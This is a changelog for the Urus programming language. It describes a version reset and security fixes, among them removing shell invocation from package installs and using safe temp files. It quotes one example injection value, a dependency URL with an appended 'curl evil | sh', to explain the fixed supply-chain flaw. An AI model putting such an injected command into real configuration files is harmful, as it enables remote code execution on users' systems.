# Changelog

## v0.1.0 — Foundation Reset (in progress)

**Version reset.** The previous 0.2.x / 0.3.x line accumulated features faster
than the foundation could absorb them — type system gaps, security holes in the
package manager, broken RAII on MSVC, hardcoded limits that silently dropped
declarations, and a parser without real error recovery. We are renumbering to
0.1.0 to signal that the language is now in its **foundation-hardening phase**
and that no API or syntax is stable until 1.0.

The features delivered in the previous 0.2/0.3 releases are kept (tuples,
runes, pattern matching, type inference, defer, constants, type aliases,
bitwise operators, do-while, methods, raw emit, error handling v2, package
manager, LSP, WASM target, testing framework, stdlib modules). What changes is
the **commitment**: each subsystem is being re-audited, security-hardened,
de-magic-numbered, and documented before any new feature is added.

See `documentation/changelog/version-history.md` for the historical record of
the previous version numbers.

### Foundation work (this release, in progress)
- Version reset from 0.3.0 → 0.1.0
- Comprehensive compiler audit; tracking issues by severity
- **Build:** fixed a parallel-build race in `compiler/CMakeLists.txt`. The
  embedded-runtime generator (`urus_runtime.c`) was attached to two
  executables and could be invoked twice concurrently under `make -j`,
  occasionally emitting a duplicate `urus_runtime_header_data_len`
  definition and breaking the link. The generated file is now compiled
  through a single `OBJECT` library and linked into both `urusc` and
  `urusc-lsp`, so the generator runs exactly once.
- **Security (pkg):** the package manager no longer passes dependency URLs
  through a shell. `urusc pkg install` previously composed a `git clone`
  invocation via `system("git clone ... %s %s", url, dest)`, which made a
  malicious `urus.toml` a supply-chain RCE vector (e.g. a dependency
  value of `https://x/r.git; curl evil | sh` would execute the trailing
  command). The dependency value is now validated against a strict
  URL/scp-spec whitelist and passed as an `argv` element to
  `fork`/`execvp` (POSIX) or `_spawnvp` (Windows), with no shell in the
  loop. Values that fail validation are rejected with a clear error.
- **LSP:** rewrote `uri_to_path` in `compiler/lsp.c`. The previous
  implementation used `strcpy()` and read `p[1]`, `p[2]`, and `p+4`
  without first checking that the URI suffix actually had that many
  bytes — a truncated `file:///C` URI from a misbehaving editor would
  read one past the end of the string. `malloc` returns were also not
  null-checked. The new version validates every offset it reads,
  copies with explicit lengths via `memcpy`, and propagates allocation
  failures back to the caller.
- **Dynamic limits:** removed five hardcoded `MAX_*` caps that silently
  dropped or rejected declarations once exceeded. All five tables now
  grow on demand:
  - `MAX_IMPORTS=64` (preprocess.c) — capped the module graph
  - `MAX_RUNES=64` (parser.c) — capped registered macros
  - `MAX_MONO=256` (codegen.c) — capped generic instantiations; exited
    the compiler past the cap, losing user work
  - `MAX_LAMBDAS=256` (codegen.c) — *silently* dropped lambdas past the
    cap, producing a quietly-truncated binary
  - `MAX_TUPLE_TYPES=64` (codegen.c) — wrote past a fixed array on
    overflow
  Each registry now uses an `xrealloc`-backed grow-by-2 scheme starting
  at 16. The `tuple_type_name` 512-byte static-buffer issue is tagged
  with a `TODO(foundation)` and tracked separately.
- **Docs:** fixed the `Foundatation` typo in every file's license header
  (13 files: `LICENSE_HEADER`, all 11 `compiler/*.c|h` sources, and
  `compiler/runtime/urus_runtime.h`). The URL `https://github.com/Urus-Foundatation/Urus`
  is not a real GitHub repo, so the headers had silently been pointing at
  a dead link since the project was created. Now reads `Urus-Foundation/Urus`.
- **Preprocessor:** the import resolver now detects circular imports. A
  separate `import_chain` stack tracks files currently being preprocessed
  (distinct from `imported_files`, which tracks already-completed imports).
  On each resolved import path the chain is checked; a hit prints a
  human-readable cycle (`a imports b imports a <-- closes the cycle`) and
  aborts cleanly instead of recursing until stack overflow. The chain is
  popped on every return path so sibling-import cycles are still caught.
- **Sema (perf):** the symbol table is now backed by a hash index. Each
  `SemaScope` keeps its dense `syms[]` array as the source of truth (so
  iteration order, stable indices, and the "scope_add then assign fields"
  caller pattern keep working) and a sidecar open-addressing hash table
  (FNV-1a, linear probing, ~0.75 load factor) maps name → index for
  `scope_lookup_local()` in amortized O(1) instead of O(n). Lookups
  dominate sema time on programs with many declarations per scope; this
  removes the quadratic worst case without changing any external API.
- **Allocator hygiene:** every compiler-internal allocation now funnels
  through `xmalloc` / `xcalloc` / `xstrdup` / `xrealloc`. The previous
  mix of raw `malloc` / `calloc` / `realloc` / `strdup` (53 call sites
  across ast, builtins, codegen, lsp, parser, pkg, preprocess, sema)
  meant a single missed NULL check could deref-on-OOM long after the
  failed allocation. The wrappers abort on out-of-memory with a clear
  message, so callers cannot accidentally use an unchecked NULL.
  Added `xcalloc` and `xstrdup` to round out the family. Also fixed a
  latent bug in `__xrealloc` that was returning the new pointer but
  never writing it back through the `void**`, so the `xrealloc(p, n)`
  macro relied on the caller's assignment alone — now both paths
  agree. Runtime allocations (`runtime/urus_runtime.h`) intentionally
  stay on checked-malloc because user programs may want to handle OOM.
- **Codegen (tuples):** rewrote `tuple_type_name()` to return a
  heap-allocated, caller-owned string built with a growable buffer,
  replacing the 512-byte static buffer that used to `exit(1)` on
  overflow. While auditing the call sites, found a *silent
  miscompilation*: `emit_single_tuple_typedef()` saved a pointer into
  the static buffer, then recursed into nested tuple typedefs which
  clobbered the buffer, after which the original pointer was used to
  emit the typedef name and a `_drop` function — producing C with the
  wrong identifier on tuples-of-tuples. `elem_sizeof` and `elem_ctype`
  were similarly leaking through static buffers; both now return
  heap-allocated strings the caller `xfree`s.
- **Security (urusc):** two issues in `compiler/urusc.c`:
  1. **TOCTOU on the temp `.c` file.** The driver used to write to a
     predictable `_urus_tmp_<pid>.c` in the current directory. A local
     attacker on the same filesystem could pre-create that path as a
     symlink to an arbitrary file the user owns; when `urusc` `fopen`'d
     it for writing, the generated C bytes would land in the link
     target. Now the temp file is opened via `mkstemps` (POSIX) or
     `_sopen_s` with `_O_CREAT|_O_EXCL` (Windows) under an
     unpredictable name, so an existing path causes the open to fail
     rather than be followed.
  2. **`system()` for emcc.** The WASM/WASI codepath built a shell
     command string and ran `system(cmd)`, interpolating the user's
     `-o` value and the temp file path. A hostile `-o` (e.g. supplied
     by a build script) could inject arbitrary shell. Now emcc is
     invoked through an explicit `argv` via `fork`/`execvp` on POSIX
     and `_spawnvp` on Windows, matching the fix already shipped for
     `urusc pkg install` in v0.1.0.
- **Tests:** added regression coverage for prior foundation PRs that
  shipped without dedicated tests:
  - `tests/run/nested_tuple_typedef` — exercises the tuple-of-tuple
    path that triggered the static-buffer aliasing miscompile fixed
    in #193.
  - `tests/run/many_runes` — defines 80 runes (past the old
    `MAX_RUNES=64`) to lock in the dynamic-growth fix from #188.
  - `tests/run/many_lambdas` — defines 300 lambdas (past the old
    `MAX_LAMBDAS=256`, which used to *silently* drop entries) to
    lock in the dynamic-growth fix.
  - `tests/invalid/import_cycle_{a,b}` — a pair of mutually-importing
    files; either entrypoint must be rejected by the cycle detection
    from #190.
- **CI:** added an AddressSanitizer + UndefinedBehaviorSanitizer matrix
  job to `.github/workflows/test.yml`. Builds the compiler with
  `clang -fsanitize=address` / `-fsanitize=undefined`,
  `-fno-sanitize-recover=all`, and runs the full CTest suite under
  ASAN_OPTIONS / UBSAN_OPTIONS that abort on first error and report
  leaks. The job is independent of `build-and-test` so a sanitizer
  hit fails its own job — and won't block release builds — while
  surfacing real bugs (use-after-free, signed overflow, NULL deref,
  leaks) that a plain Release build silently tolerates.

---

## Pre-reset history (formerly 0.3.0 and earlier)

The entries below are preserved for historical context. They describe features
that ship in 0.1.0 — the version numbering changed, the code did not.

## Unreleased (since V0.3.0)

### New Features
- **Extended Pattern Matching**: `match` now works on `int`, `str`, and `bool` values with literal patterns and `_` wildcard (#117, #118)
- **Defer Statements**: `defer { ... }` for scope-based cleanup, LIFO execution order (#112, #116)
- **Standard Library Path**: `import` now searches `URUSCPATH` for library modules (#114)
- **Raw Emit**: `__emit__("...")` to inline C code directly (#113)
- **Type Aliases**: `type ID = int;` for semantic type aliasing (#110, #111)
- **Do-While Loops**: `do { ... } while cond;` (#108, #109)
- **Array Method Syntax**: `arr.len()`, `arr.push(x)`, `arr.pop()` (#106, #107)
- **String Method Syntax**: `s.trim()`, `s.upper()`, `s.contains(sub)`, etc. (#104, #105)
- **Constants**: `const MAX: int = 100;` compile-time constants (#102, #103)
- **Bitwise Operators**: `&`, `|`, `^`, `~`, `<<`, `>>`, `&~`, plus `**` (exponent) and `%%` (floored remainder) (#99)
- **Mutable Function Parameters**: `fn foo(mut x: int)` (#98)

### Bug Fixes
- Fixed multiple security vulnerabilities from audit (#100, #101)
- Fixed empty `URUS_LIB_DIR` in Termux installs (#505de65)
- Fixed garbage unused warnings for imported declarations (#fcd02f1)

### Improvements
- Runtime moved from `include/urus_runtime.h` to `runtime/urus_runtime.h`
- Updated library installation paths and preprocess logic

---

## V0.3.0 (2026-03-21)

### New Features
- **Tuple Types**: `(int, str)` — stack-allocated compound types with `.0`, `.1` field access (#15)
- **Tuple Destructuring**: `let (x, y): (int, str) = get_pair();` and `for (k, v) in pairs { }` (#74)
- **Runes (Macro System)**: `rune square(x) { x * x }` invoked with `square!(5)` — Urus's unique macro system (#66)
- **Statement-level Runes**: Rune bodies with semicolons expand as statement blocks (#75)
- **If-Expressions**: `if cond { a } else { b }` as expressions, compiles to C ternary (#71, #79)
- **Type Inference**: `let x = 42;` — type annotation is now optional, inferred from initializer (#78)
- **HTTP Built-ins**: `http_get(url)` and `http_post(url, body)` via curl (#87)
- **String Escape Sequences**: `\t` (tab) and `\0` (null) now supported (#77)

### Bug Fixes
- Fixed `urus_str_replace()` missing `r->len` assignment — uninitialized length field (#89 VULN-01)
- Fixed `urus_pop()` memory leak — now calls `elem_drop` before discarding element (#89 VULN-02)
- Fixed unchecked `malloc`/`realloc` — added `urus_alloc`/`urus_realloc` wrappers with NULL checks (#89 VULN-03)
- Fixed `urus_read_file()` — added `ftell()` error check and `fread()` return capture (#89 VULN-04)
- Fixed array of tuples/results producing incorrect C codegen — `elem_sizeof`/`elem_ctype` now handle TYPE_TUPLE and TYPE_RESULT (#70)
- Fixed tuples containing heap types (str, array) leaking memory — generate drop functions for tuples with heap fields (#73)
- Fixed rune table overflow silently discarding macros — now emits error (#76)
- Fixed rune argument count mismatch giving unhelpful error message (#72)

### Improvements
- RAII cleanup for tuple types containing heap-allocated fields
- Tuple typedef system with unique C type names per tuple signature
- Compiler version bumped to 0.3.0

### Contributors
- **aimardcr** — security vulnerability report (#89)
- **billalxcode** — HTTP request feature request (#87)
- **RasyaAndrean** — all feature implementations, bug fixes, documentation

---

## V0.2/3(A) "Added" (2026-03-17)

### New Features
- **Struct Spread Syntax**: `Point { x: 10.0, ..p1 }` — create a new struct by copying fields from an existing instance and selectively overriding fields (#47)
- **Numeric Separators**: `1_000_000`, `3.14_159` — underscores as visual separators in integer and float literals (#49)

### Bug Fixes
- Fixed parser infinite loop on nested struct/enum with syntax errors — added error recovery breaks (#27)
- Fixed empty struct literal `Abc{}` producing confusing error — parser now handles it correctly (#42)
- Fixed string `+=` codegen — now generates `urus_str_concat()` instead of invalid C pointer arithmetic (#43)
- Fixed trailing decimal float `20.` not accepted by lexer — changed condition to allow floats without fractional digits (#48)
- Fixed garbage column numbers in sema error messages — `lexer_init()` was not initializing `line_start` field (#50)
- Fixed undefined function call causing segfault (PR #45)
- Fixed more accurate semantic error messages (PR #44)
- Fixed default output name based on platform: `a.out` (Linux), `a.exe` (Windows) (PR #39)
- Fixed version mismatch in Dockerfile
- Removed `inline` from `urus_str_equal` — GCC `-O2` already handles inlining

### Improvements
- Added Termux (Android) build instructions in README
- Editor support separated into dedicated repo: `Urus-Foundation/editor-support`
- Assets and diary moved to `Urus-Foundation/initial-resource`
- GitHub issue templates standardized to English (PR #38)

### Contributors
- **fepfitra** — issue reports (#27, #42, #43, #47, #48, #49, #50), default output name fix (PR #39)
- **John-fried** — segfault fix (PR #45), error accuracy (PR #44), assets removal (PR #40), issue templates (PR #38)
- **RasyaAndrean** — bug fixes, feature implementation, documentation, repo management

---

## V0.2/2(F) "Fixed" (2026-03-09)

### Build System
- Migrated from Makefile/build.bat to **CMake** for cross-platform portability
- Added `cmake/embed-string.cmake` to embed runtime header into the compiler binary

### Bug Fixes
- Fixed missing `stddef.h` include in `urus_runtime.h` (Linux compatibility)
- Fixed implicit declaration of POSIX functions in C11 mode
- Fixed unterminated string in `emit()` codegen function
- Compiler is now **standalone** — `urus_runtime.h` is embedded into the binary, no external runtime file needed
- Fixed `error.c` using POSIX `getline()` — replaced with portable `fgets()` for MSVC/Windows compatibility
- Fixed `_urus_tmp.c` double CRLF corruption on Windows — temp file now written in binary mode
- Fixed `--help`/`--version` flags not recognized (was treated as filename)
- Fixed GCC `cc1` not found on Windows — compiler now injects GCC bin directory into PATH
- Removed obsolete `-I include` flag from GCC invocation (runtime is now embedded)
- Added MSVC compatibility defines (`_CRT_SECURE_NO_WARNINGS`, `_CRT_NONSTDC_NO_DEPRECATE`)

### Improvements
- Added `show_help()` CLI usage with `--help` and `-h` flags
- Added `--version` / `-v` flag to display compiler version
- Rich **error diagnostics**: colored output with filename, line number, column caret (^) pointer
- Error reporting integrated into both **parser** and **semantic analysis**
- Added `install` and `uninstall` targets via CMake
- Updated installation documentation for CMake workflow
- Added parser error test case (`tests/invalid/parser/unclosed_brace.urus`)
- Dockerfile updated to use CMake build and org URL updated

### Contributors
- **John-fried** — Linux fixes, CMake migration, standalone compiler, error logging (PR #2-#7)
- **RasyaAndrean** — Project maintenance, PR reviews

---

## V0.2/1 (2026-03-02)

### New Features
- **Enums / Tagged Unions**: `enum Shape { Circle(r: float); Rect(w: float, h: float); Point; }`
- **Pattern Matching**: `match` statement with variant bindings
- **Modules / Imports**: `import "module.urus";` with circular import detection
- **Error Handling**: `Result<T, E>` type with `Ok(val)` / `Err(msg)`, `is_ok()`, `is_err()`, `unwrap()`, `unwrap_err()`
- **String Interpolation**: `f"Hello {name}, age {age}"` desugars to to_str + concat
- **For-each Loops**: `for item in array { ... }` — iterate over array elements
- **Conversion Functions**: `to_int()` and `to_float()` now fully implemented

### Bug Fixes
- Fixed Makefile missing sema.c and codegen.c
- Fixed `ast_type_str` static buffer clobber (round-robin buffers)
- Fixed `urus_str_replace` unsigned underflow with signed diff
- Fixed array codegen removing GCC statement expressions (standard C11)
- Fixed array element types (now supports `[float]`, `[str]`, `[bool]`, `[MyStruct]`)
- Fixed array index assignment generating invalid C lvalue
- Fixed temp file path dead ternary
- Added bounds checking on array access
- Break/continue now validated to be inside loops

### Improvements
- Reference counting: `retain`/`release` functions for str, array
- Larger emit buffer (4096 from 2048)
- `to_str` now retains the string (proper refcounting)
- Empty function params emit `void` in C for correctness
- Version string in compiler output

---

## V0.1 (2025-03-01)

### Initial Release
- Primitive types: int, float, bool, str, void
- Variables with `let` / `let mut`, mandatory type annotation
- Functions with typed parameters and return types
- Control flow: if/else, while, for (range-based), break, continue
- Operators: arithmetic, comparison, logical, assignment
- Structs (declaration, literal creation, field access)
- Arrays (literal, indexing, len, push)
- String concatenation with `+`
- Comments (single-line `//`, multi-line `/* */`)
- 30+ built-in functions (string ops, math, file I/O, assert)
- Transpiles to C via GCC
